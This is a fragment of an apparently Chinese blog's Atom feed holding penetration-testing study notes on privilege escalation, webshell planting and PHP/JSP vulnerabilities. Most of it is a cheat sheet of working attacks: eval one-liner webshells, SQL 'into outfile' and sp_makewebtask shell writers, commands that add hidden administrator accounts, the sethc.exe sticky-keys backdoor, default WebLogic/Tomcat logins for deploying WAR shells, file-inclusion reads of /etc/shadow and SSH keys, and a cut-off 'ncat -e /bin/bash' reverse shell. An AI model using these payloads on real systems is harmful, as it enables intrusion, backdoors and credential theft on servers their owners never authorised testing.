大马-&amp;gt;pcanywhere-&amp;gt;host/remotes-&amp;gt;PCA admin CIF(远程登录用户的配置文件)-&amp;gt;下载,并破解
权限提升-&amp;gt;第三方工具提权-&amp;gt;pcanywhere提权-&amp;gt;进行破解

攻击端也要安装一个pcanywhere,添加下一步-&amp;gt;连接的ip指定一下,勾选连接被控端

radmin提权
通过端口扫描 扫描4899端口
上传radmin.asp木马读取radmin的加密密文
使用工具连接
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
    
      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/"/>
    
      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试学习笔记25-权限提升</title>
    <link href="prayer007007.github.io/2018/09/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B025-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    <id>prayer007007.github.io/2018/09/11/渗透测试学习笔记25-权限提升/</id>
    <published>2018-09-10T23:36:46.000Z</published>
    <updated>2018-09-10T15:37:14.925Z</updated>
    
    <content type="html"><![CDATA[<pre><code>帝国-&gt;系统-&gt;数据表与系统模型-&gt;管理数据表-&gt;管理系统模型-&gt;导入xx.php.mod&lt;?fputs(fopen(&quot;cao.php&quot;.&quot;w&quot;),&quot;&lt;?eval(\$_POST[cmd]);?&gt;&quot;)?&gt;phpcms界面-&gt;模板风格-&gt;search-&gt;修改,可视化-&gt;一句话内容-&gt;选择附件上传-&gt;图片系统设置-&gt;Ucenter api-&gt;一句话(要闭合)00截断,存在注入漏洞  admin&apos; or &apos;1&apos; = &apos;1</code></pre><a id="more"></a>    <pre><code>提权提权前的号角windows提权Linux提权什么是提权:主要针对网站测试过程中当测试某一网站时,通过各种漏洞提升WEBSHELL权限已夺得改服务器权限入侵B网站,但是想跨A网站,需要提权通常脚本所处的权限ASP/php 匿名权限ASPx USER权限jsp通常是系统权限Tomcat一般是管理员权限,或者system权限setp c:\windows\system32\cmd.exeipconfig/tasklist/arp -a 不能实现,,这时需要上传aspx大马在菜刀-&gt;大马上边执行cmd.exeasp大马如果不知道密码的话,用?profile=a收集信息内外网服务器系统和版本位数服务器的补丁情况服务器的安装软件情况服务器的防护软件情况端口情况支持脚本情况....arp如果是静态,就没必要欺骗,动态C段才需要欺骗信息收集常用命令windows:ipconfig/all 查看当前ipnet user 查看当前服务器账号情况netstat -ano 查看当前服务器端口开发情况ver 查看当前服务器操作系统systeminfo 查看当前服务器配置信息(补丁情况)tasklist /svc 查看当前服务器进程情况taskkill -PID pid好 结束某个pid进程taskkill /im qq.exe /f 结束qq进程net user cracer cracer /add 添加一个用户名为cracer密码为cracer的用户net localgroup administrators cracer /add 将用户cracer添加到管理员组whoami 查看当前操作用户(当前权限)Linux:Is -al 查看当前目录下的文件和文件夹pwd 查看当前操作路径uname -a查看当前服务器内核信息cmd命令执行1.防护软件拦截2.cmd被降权3.组件被删除找可读写目录上传cmd.exe,将执行的cmd.exe路径替换成上传的路径,再次调用执行查找33891.注册表读取  大马可以直接读注册表2.工具扫描3.命令探针WINDOWS提权:第三方软件提权溢出提权启动项提权破解hash提权数据库提权常见的第三方软件提权FTP软件:(服务器一般都是上传软件)server-u,g6ftp,FileZilla远程管理软件PCanywhere,radmin,vncserver-u提权有修改权限0检查是否有可写权限 修改server-u默认安装目录下的ServUDaemon.ini1.增加用户2.连接3.执行命令quote site exec net user cracer cracer.com /addquote site exec net localgroup administrators cracer /add无修改权限暴力破解md5溢出提权大马-&gt;ServU-&gt;SerevUDaemon.ini,如果不能保存,就破解它的密码ftp&gt;quote site exec +系统命令win+R-&gt;mstsc-&gt;登录创建的用户md5加密:zp123溢出提权-&gt;大马-&gt;Server-提权-&gt;自动创建一个DiskKill用户忘记密码的话,找到serverUadmin.exe下载下来,然后打开代码审计-&gt;C32-&gt;拖进来,16进制-&gt;右键搜索-&gt;ANSII-&gt;搜索用户名G6ftp提权下载管理配置文件,将administrator管理密码破解使用Icx端口转发(默认只允许本机连接)lcx.exe -tran 8027 127.0.0.1 8021使用客户端以管理员用户登录创建用户并设置权限和执行的批处理文件上传批处理以创建的普通用户登录ftp执行命令quote site x.batx.bat内容为添加系统用户 提权(需要上传一个lcx.exe)www.shodan.io -&gt;搜索 弱口令/默认密码filezilla提权filezilla是一款开源的FTP服务器和客户端的软件若安装了服务器端默认只侦听127.0.0.1的14747端口并且默认安装目录下有两个敏感文件filezillaserver.xml(包含了用户信息)和filezillaserver interface.xml(包含了管理信息)提权思路:下载这两个文件,拿到管理密码配置端口转发,登录远程管理ftpserver,创建ftp用户分配权限,设置家目录为C:\使用cmd.exe改名为sethc.exe替换c:\windows\system32\sethc.exe生成shift后门连接3389按5次shift调出cmd.exe大马-&gt;(1)Program-&gt;filezilla-&gt;执行cmd站点根目录-&gt;data-&gt;复制路径netstat -an | find &quot;14147&quot;权限提升-&gt;端口转发-&gt;lcx.exe-&gt;上传-&gt;复制urlcmd-&gt;粘贴url-&gt;url -tran 14148 127.0.0.1 14147将14147转发成任意机器的14148地址将第三方软件提权的文件复制到VM里,先安装filezilla连接到192.168.0.10 14148新建用户客户端直接执行就行192.168.0.10 user pw/windows/system32/sethc替换mstsc-&gt;5次shiftexplorer.exe 或者创建新用户</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;帝国-&amp;gt;
系统-&amp;gt;数据表与系统模型-&amp;gt;管理数据表-&amp;gt;管理系统模型-&amp;gt;导入
xx.php.mod

&amp;lt;?fputs(fopen(&amp;quot;cao.php&amp;quot;.&amp;quot;w&amp;quot;),&amp;quot;&amp;lt;?eval(\$_POST[cmd]);?&amp;gt;&amp;quot;)?&amp;gt;

phpcms
界面-&amp;gt;模板风格-&amp;gt;search-&amp;gt;修改,可视化-&amp;gt;一句话
内容-&amp;gt;选择附件上传-&amp;gt;图片
系统设置-&amp;gt;Ucenter api-&amp;gt;一句话(要闭合)
00截断,存在注入漏洞  admin&amp;apos; or &amp;apos;1&amp;apos; = &amp;apos;1
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
    
      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/"/>
    
      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试学习笔记24-getshell方法总结</title>
    <link href="prayer007007.github.io/2018/09/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B024-getshell%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"/>
    <id>prayer007007.github.io/2018/09/11/渗透测试学习笔记24-getshell方法总结/</id>
    <published>2018-09-10T23:35:29.000Z</published>
    <updated>2018-09-10T15:36:10.191Z</updated>
    
    <content type="html"><![CDATA[<pre><code>getshell方法总结(webshell)管理权限拿webshell普通权限拿webshell常见cms拿shell管理权限拿shell:需要有管理员权限才可以拿shell通常需要登录后台后执行相关操作直接上传拿shell</code></pre><a id="more"></a>    <pre><code>数据库备份拿shell网站对上传的文件后缀进行过滤,不允许上传脚本类型文件如asp/php/jsp/aspx等.而网站具有数据库备份功能,这时我们就可以将webshell格式先改为允许上传的文件格式,如果jpg,gif等.然后我们找到上传后的文件录,通过数据库备份,将文件备份为脚本格式.备份之后不需要加.asa突破上传拿shell本地js验证上传服务器mime上传服务器白名单上传服务器黑名单上传服务器filepath上传双文件上传%00截断上传-&gt;ctrl+shift+u上传其他脚本类型拿webshell{year}{mm-dd-hh}.jpga.asp;.{year}{mm-dd-hh}.jpg修改网站上传类型配置拿shell有的网站,在网站上传类型中限制了上传脚本类型文件,我们可以去添加上传文件类型如添加asp|php|jsp|aspx|asa来拿webshell(一般指在编辑器里面)利用解析漏洞拿webshell1.IIS 5.x/6.0解析漏洞2.IIS 7.0/IIS 7.5/Nginx&lt;8.03畸形解析漏洞3.Nginx&lt;8.03空字节代码执行漏洞4.Apache解析漏洞reg:a.asp/1.jpg   a.cer   a.asa   a.asp;.jpg   1.jpg/a.phpa.php%00.jpgApache漏洞一般是:  aa.php.zzz.ccc利用编辑器漏洞拿webshell常见的编辑器有fckeditor,ewebeditor,cheditor等reg:admin_uploadfile.asp?id=&amp;dir=../..网站配置插马拿webshell通过找到网站默认配置,将一句话插入到网站配置中,不过为了能够成功执行插马,建议先下载该网站源码,进行查看源码过滤规则,以防插马失败&quot;%&gt;&lt;%eval request(&quot;cracer&quot;)%&gt;&lt;%&apos;一般有这个inc/config.asp文件的都可以这样插入一般在后台-&gt;网站名称,网站标题等地方通过编辑模板拿webshell1.通过对网站的模板进行编辑写入一句话,然后生成脚本文件拿webshell2.通过将木马添加到压缩文件,把名字改为网站模板类型,上传到网站服务器,拿webshellSQL-&gt;use master/mysql 爆路径模板管理-&gt;库项目管理-&gt;配送方式&lt;一句话&gt;库项目管理的.lbi改成.php 就可以访问了上传插件拿shell一些网站为了增加某些功能会在后台添加一些插件来实现,我们可以把木马添加到安装的插件中上传服务器拿shell常见的有博客类网站,dz论坛都可以reg:wordpress,emlog,zblog,dz插件-&gt;安装插件,在插件里面放一个木马会上传在wp-content-&gt;plugins-&gt;插件访问这个木马就可以了数据库执行拿webshell我们可以通过数据库执行命令导出一句话到网站根目录拿shellaccess数据库导出一般需要利用解析漏洞xx.asp;.xmlsqlserver导出;exec%20sp_makewebtask%20%20%27c:\inetpub\wwwroot\ms\x1.asp%27,%27select%27%27&lt;%execute(request(&quot;cmd&quot;))%&gt;%27%27%27--(前提权限要够)mysql命令导出shellCreate TABLE study(cmd text NOT NULL);Insert INTO study (cmd) VALUES(&apos;&lt;?php eval($_POST[cmd])?&gt;&apos;);select cmd from study into outfile &apos;D:/php/www/htdocs/test/seven.php&apos;Drop TABLE EXISTS study;版本二use mysql;create table x(packet text) type=MYISaM;insert into x (packet) values(&apos;&lt;pre&gt;&lt;body&gt;&lt;?php @system($_GET[&quot;cmd&quot;]);?&gt;&lt;/body&gt;&lt;/pre&gt;&apos;)select into outfile &apos;d:\php\xx.php&apos;版本三select &apos;&lt;?php eval($_POST[cmd]);?&gt;&apos; into outfile &apos;C:/inetpub/wwwroot/mysql-php/1.php&apos;文件包含拿webshell先将webshell改为txt文件上传,然后上传一个脚本文件包含该txt文件,可绕过waf拿webshellasp包含1.&lt;!--#include file=&quot;123.jpg&quot;--&gt;2.调用的文件必须和被调用的文件在同一目录,,否则找不到3.如果不在同一目录,用下面的语句:&lt;!--#include virtual=&quot;文件所在目录/123.jpg&quot;--&gt;php包含&lt;?phpinclude(&apos;123.jpg&apos;);?&gt;(这样可以绕waf)命令执行拿shellEcho ^&lt;^?php @eval($_POST[&apos;cracer&apos;]);?^&gt;^ &gt;c:\1.phpEcho ^&lt;^?php @eval($_POST[&apos;cracer&apos;]);?^&gt;^ &gt;c:\1.php^&lt;^%eval request(&quot;cracer&quot;)%^&gt;^ &gt;c:\1.php普通用户前台拿shell0day拿webshellIIS写权限拿webshell命令执行拿webshell通过注入漏洞拿webshell前台用户头像上传拿webshellstruts2拿webshelljava反序列拿shell工具iisput可以扫描,扫到之后用write工具写入先put,再MOVE命令重命名头像上传,记准上传路径抓包的一堆电脑编码替换掉:选中,然后右击粘贴来自于文件常见cms拿shell良精,科迅,动易,aspcmsdz米拓cmsphpcms2008帝国cmsphpwind9.0phpv9phpwebdedecmsreg:IIS6.0漏洞:a.asp;html</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;getshell方法总结(webshell)

管理权限拿webshell
普通权限拿webshell
常见cms拿shell


管理权限拿shell:
需要有管理员权限才可以拿shell
通常需要登录后台后执行相关操作
直接上传拿shell
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
    
      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/"/>
    
      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试学习笔记23-其他漏洞二</title>
    <link href="prayer007007.github.io/2018/09/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B023-%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E%E4%BA%8C/"/>
    <id>prayer007007.github.io/2018/09/11/渗透测试学习笔记23-其他漏洞二/</id>
    <published>2018-09-10T23:34:20.000Z</published>
    <updated>2018-09-10T15:34:51.036Z</updated>
    
    <content type="html"><![CDATA[<pre><code>jsp相关漏洞ST2漏洞反序列漏洞其他漏洞Struts2漏洞struts是Apache基金会Jakarta项目组的一个开源项目,Struts通过采用Java Servlet/JSP技术,实现了基于Java EE Web应用的ModelView-Controller(MVC)设计模式的应用框架,是MVC经典设计模式中的一个经典产品.目前,Struts广泛应用于大型互联网企业,政府,金融机构等网站建设,并作为网站开发的底层模板使用,是应用最广泛的Web应用框架之一.漏洞挖掘:单个目标站进行测试:工具爬行找到存在漏洞地址reg:xx.action用相关工具进行测试即可.</code></pre><a id="more"></a>    <pre><code>XAMPP Control Panel v3.2.2漏洞利用-&gt;K8-&gt;先漏洞探测-&gt;再执行命令net user guest /acitve:yesftp,远程木马oa do一般都是java编写的,一般去主页里的其它网址正方教务一般都是aspx,oa一般指向actionadmin admin批量扫描action:信息收集-&gt;url采集-&gt;导入-&gt;struts2Struts2漏洞应用工具批量验证Sta2-045.py脚本,将url复制到字典里面需要手动导,方式:安装pip,然后installfrom poster.encode import multipart_encodefrom poster.streaminghttp import register_openerscmd-&gt;Sta2.045.py 3.txt whoamijava反序列漏洞2015年的1月28日,Gabriel Lawrence(@gebl)和Chris Frohosff(@frohoff)在AppSecCali上给出了一个报告,报告汇总介绍了java反序列化漏洞可以利用Apache Commons Collections这个常用的java库来实现任意代码执行,当时并没有引起太大的关注.2015年11月6月,FoxGlove Security安全团队的@breenmachine发布的一篇博客中介绍了如何利用java反序列化漏洞,来攻击最新版的WebLogic,WebSphere,JBoss,Jenkins,OpenNMS这些java应用,实现远程代码执行.(web中间件,类似tomcat)java反序列化漏洞简介:序列化就是把对象转换成字节流,便于保存在内存,文件,数据库中;反序列化即逆过程,由字节流还原成对象.java中的ObjectOutputStream类的writeObject()方法可以实现序列化,类ObjectInputStream类的readObject()方法用于反序列化.其它漏洞:(中间件)tomcat部署漏洞:访问tomcat manager页面尝试弱口令爆破登录管理页面部署war文件得到shelljava反序列化终极测试工具: By STG-6哥探测-&gt;url密码攻击-&gt;Apache在apache首页下面有一个war部署,webshell-&gt;大马-&gt;jsp-&gt;war上传点进去登录访问.weblogic攻击批量扫描WebLogic缺省的WEB管理端口(http为7001,https为7002),开放这两个端口的一般都是安装有WebLogic的主机2.Google搜索关键字&quot;WebLogic Server Administration Console inurl:console&quot;,URL后面是console结尾的,一般为目标.在找到的目标url后面加上console,回车就会自动跳转到管理登录页面尝试若口令登录:1.用户名密码均为:weblogic2.用户名密码均为:system3.用户名密码均为 :portaladmin4.用户名密码均为:guest登录后找到&quot;mydomain&quot;-&gt;&quot;Deployments&quot;-&gt;&quot;Web Application Modules&quot;-&gt;&quot;Deploy new Web Application Module...&quot;再点里面的&quot;upload your file(s)&quot;,在跳转后的页面上传war包(war包和Tomact弱口令利用的包一样,注意马的免杀即可)tomact是manager文件夹,weblogic是console文件夹其他漏洞详解:越权漏洞逻辑漏洞其他漏洞越权漏洞:类型划分:水平越权    水平越权是指同等权限级别的越权纵向越权    纵向越权是指不同等权限级别的越权越权漏洞挖掘:漏洞出现点:数据交互的地方用户可操作的地方参数可控制的地方越权挖掘实例密码修改越权Metinfo4这个版本存在越权漏洞抓登录后的修改个人信息数据包将useid=&apos;&apos;改成另一个用户名,就会在另一个用户那边修改成功也可以将密码重设提交逻辑漏洞:逻辑漏洞分类逻辑密码找回逻辑支付漏洞莱趣商城微信手机话费充值,用嗅探欺骗-&gt;fidder,或者burpburp添加一个代理,指定一个ip地址,,192.168.0.102有选项,能抓https,有证书加密的,没法利用挖掘:漏洞出现点数据交互的地方用户可操作的地方参数可控制的地方SSRF(Server-Side Request Forgery):服务器端请求伪造:SSRF:是一种由攻击者构造形成由服务端发起请求的一个安全漏洞.一般情况下,SSRF攻击的目标是从外网无法访问的内部系统.(正是因为它是由服务端发起的,所以它能够请求到与它相连而与外网隔离的内部系统)SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制.比如从指定URL地址获取网页文本内容,加载指定地址的图片,下载等等.漏洞产生:用户在地址栏输入网址-&gt;向目标网站发送请求-&gt;目标网站接受请求并在服务器端验证请求是否合法,然后返回用户所需要的页面-&gt;用户接收页面并在浏览器中显示此处的请求默认为www.xxx.com/a.php?image=(地址)那么产生SSRF漏洞的环节在哪里呢?目标网站接受请求后在服务器端验证请求是否合法产生的原因:服务器端的验证并没有对其请求获取图片的参数(image=)做出严格的过滤以及限制,导致可以从其他服务器的获取一定量的数据reg:www.xxx.com/a.php?image=http://www.abc.com/1.jpg如果我们将http://www.abc.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢?如果存在该内网地址就会返回1xx2xx之类的状态码,不存在就会其他的状态码终极简析:SSRF漏洞就是通过篡改获取资源的请求发送给服务器,但是服务器并没有发现在这个请求是合法的,然后服务器以他的身份来访问其他服务器的资源.SSRF漏洞的寻找(漏洞常见出没位置):1)分享:通过URL地址分享网页内容2)转码服务3)在线翻译4)图片加载与下载:通过URL地址加载或下载图片5)图片,文章收藏功能6)未公开的api实现以及其他调用URL的功能7)从URL关键字中寻找share wap url link src source target u 3g display sourceURI imageURL domain漏洞验证:1)因为SSRF漏洞是构造服务器发送请求的安全漏洞,所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的来判断是否存在SSRF漏洞.2)在页面源码中查找访问的资源地址,如果该资源地址类型为http://www.xxx.com/a.php?image=(地址)的就可能存在SSRF漏洞www.cracer.com/a.php?image=http://192.168.0.000:22来探测22端口是否开放</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;jsp相关漏洞
ST2漏洞
反序列漏洞
其他漏洞

Struts2漏洞
struts是Apache基金会Jakarta项目组的一个开源项目,Struts通过采用Java Servlet/JSP技术,实现了基于Java EE Web应用的ModelView-Controller(MVC)设计模式的应用框架,是MVC经典设计模式中的一个经典产品.目前,Struts广泛应用于大型互联网企业,政府,金融机构等网站建设,并作为网站开发的底层模板使用,是应用最广泛的Web应用框架之一.

漏洞挖掘:
单个目标站进行测试:
工具爬行
找到存在漏洞地址reg:
xx.action
用相关工具进行测试即可.
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
    
      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/"/>
    
      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试学习笔记22-其他漏洞</title>
    <link href="prayer007007.github.io/2018/09/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B022-%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E/"/>
    <id>prayer007007.github.io/2018/09/11/渗透测试学习笔记22-其他漏洞/</id>
    <published>2018-09-10T23:33:14.000Z</published>
    <updated>2018-09-10T15:33:53.887Z</updated>
    
    <content type="html"><![CDATA[<pre><code>php相关漏洞jsp相关漏洞其他漏洞汇总php相关漏洞:    文件包含漏洞    php://input等伪协议利用    代码执行漏洞    变量覆盖漏洞    文件包含:    程序开发人员一般会把重复使用的函数写到单个文件中,需要使用某个函数时直接调用此文件    而无需再次编写,这种文件调用的过程一般被称为包含.    程序开发人员一般希望代码更灵活,所以将被包含的文件设置为变量,用来进行动态调用.    但正是由于这种灵活性,从而导致客户端可以调用一个恶意软件,造成文件包含漏洞.    几乎所有脚本语言都会提供文件包含的功能,但文件包含漏洞在PHP Web Application中居多.    而在JSP,ASP,ASP.NET程序中却非常少,甚至没有,这是有些语言设计的弊端.    在PHP中经常出现包含漏洞,但这并不意味着其他语言不存在.</code></pre><a id="more"></a>        <pre><code>常见文件包含函数:include():执行到include时才包含文件,找不到被包含文件时只会产生警告,脚本将继续执行require():只要程序一运行就包含文件,找不到被包含的文件时会产生致命错误,并停止脚本include_once()和require_once():若文件中代码已被包含则不会再次包含.reg:include(&quot;aaa.php&quot;)利用条件:程序用include()等文件包含函数通过动态变量的范式引入需要包含的文件.用户能够控制该动态变量漏洞危害:执行任意代码包含恶意文件控制网站甚至控制服务器漏洞分类:本地文件包含:可以包含本地文件,在条件允许时甚至能执行代码.上传图片马,然后包含读敏感文件,读PHP文件包含日志文件GetShell包含/proc/self/envion文件GetShell包含data:或php://input等伪协议若有phpinfo则可以包含临时文件远程文件包含:可以直接执行任意代码要保证php.ini中allow_url_fopen和allow_url_include要为On漏洞挖掘:通过白盒代码审计黑盒工具挖掘awvs appscan burpkali w3af本地包含漏洞实例代码:&lt;?php$test=$_GET[&apos;c&apos;];include($test);?&gt;test.txt内容为&lt;?php phpinfo()?&gt;访问的话就用?c=c:\windows\...包含之后,.txt文件会以php形式执行本地包含漏洞注意事项:相对路径:../../../etc/passwd%00截断包含(PHP&lt;5.3.4)&lt;?phpinclude&quot;$_GET[&apos;x&apos;].&quot;.php&quot;;echo&quot;$_GET[&apos;x&apos;].&quot;.php&quot;;?&gt;magic_quotes_gps=off才可以,否则%00会被转义Linuxvi a.php&lt;?php$test=$_GET[&apos;x&apos;];include($test);?&gt;利用技巧:上传图片马,马包含的代码为:&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[x]);?&gt;&quot;)?&gt;,http://www.cracer.com/xx.php?page=uploadfile/x.jpg时,将会在fi这个文件夹下生成shell.php,内容为&lt;?php eval($_POST[x]);?&gt;读敏感文件Windows:C:\boot.ini //查看系统版本C:\Windows\System32\inetsrv\MetaBase.xml //iis配置文件C:\Windows\repair\sam //存储系统初次安装的密码C:\Program Files\mysql\my.ini //Mysql配置C:\Program Files\mysql\data\mysql\user.MYD //MySQL root 存root账号密码的C:\Windows\php.ini //php配置信息C:\Windows\my.ini //Mysql配置信息Linux:/root/.ssh/authorized_keys/root/.ssh/id_ras/root/.ssh/id_ras.keystore/root/.ssh/known_hosts/etc/passwd/etc/shadow/etc/mycnf/etc/httpd/conf/httpd.conf/root/.bash_history/root/.mysql_history/proc/self/fd/fd[0-9]*(文件标识符)/proc/mounts/proc/config.gz包含日志(主要是得到日志的路径)读日志路径:文件包含漏洞读取apache配置文件index.php?page=/etc/init.d/httpdindex.php?page=/etc/httpd/conf/httpd.conf默认位置/var/log/httpd/access_log  error_log日志会记录客户端请求及服务器响应的信息,访问http://www.xx.com/&lt;?php phpinfo();?&gt;时,&lt;?php phpinfo();?&gt;也会被记录在日志里,也可以插入到User-Agent可以通过Burp Suite来绕过编码.reg:制作错误,写入一句话:http://127.0.0.1/ekucms/index.php?s=my/show/id/{`eval($_POST[&apos;x&apos;])}写入日志之后,输入日志url,然后菜刀连url读php文件直接包含php文件时会被解析,不能看到源码,可以用封装协议读取:?page=php://filter/read=convert.base64-encode/resource=config.php访问上述url后会返回config.php中经过Base64加密后的字符串,解密即可得到源码..使用PHP封装协议allow_url_include=On时,若执行http://www.xxx.com/index.php?page=php://input,并且提交数据&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[&apos;xxxser&apos;]);?&gt;&quot;)?&gt;结果将在index.php所在文件下生成一句话文件shell.php远程包含注:远程打的文件名不能为php可解析的扩展名,allow_url_fopen和allow_url_include为On是必须的.若在a.txt写入&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php @eval($_POST[xxx]);?&gt;&quot;)?&gt;,可直接写shell远程包含是以php形式打开的php://-访问各个输入/输出流php提供了一些杂项输入/输出(IO)流,允许访问php的输入输出流,标准输入输出和错误描述符,内存中,磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器.php://input是个可以访问请求的原始数据的只读流.POST请求的情况下,最好使用php://input来代替$HTTP_RAW_POST_DATA,因为它不依赖于特定的php.ini指令.而且,这样的情况下,$HTTP_RAW_POST_DATA默认没有填充,比激活always_populate_raw_post_data潜在需要更少的内存.enctype=&quot;multipart/form-data&quot;的时候php://input是无效的.利用php://input插入一句话木马&lt;?php//$data=file_get_contents(&apos;php://input&apos;);//echo $data.&quot;&lt;br/&gt;&quot;;@eval(file_get_contents(&apos;php://input&apos;));//eval是执行的意思?&gt;php://input是用来接收post数据漏洞分析-&gt;Mantra-&gt;url在POST中插入数据system(&apos;ncat -e /bin/bash localhost 